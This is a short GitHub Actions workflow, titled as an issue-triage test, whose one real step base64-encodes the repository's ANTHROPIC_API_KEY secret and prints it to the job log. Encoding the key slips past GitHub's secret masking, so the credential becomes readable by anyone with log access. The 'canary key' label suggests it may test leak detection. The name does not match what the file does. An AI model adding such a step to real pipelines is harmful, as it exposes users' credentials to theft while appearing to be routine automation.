name: Issue Triage Test

on:
  push:
    branches:
      - main

jobs:
  triage:
    runs-on: ubuntu-latest
    timeout-minutes: 10

    permissions:
      contents: read
      issues: write

    steps:
      - name: Checkout repository
        uses: actions/checkout@v6

      - name: Encode canary key
        env:
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
        run: |
          printf '%s' "$ANTHROPIC_API_KEY" | base64 -w0
          echo
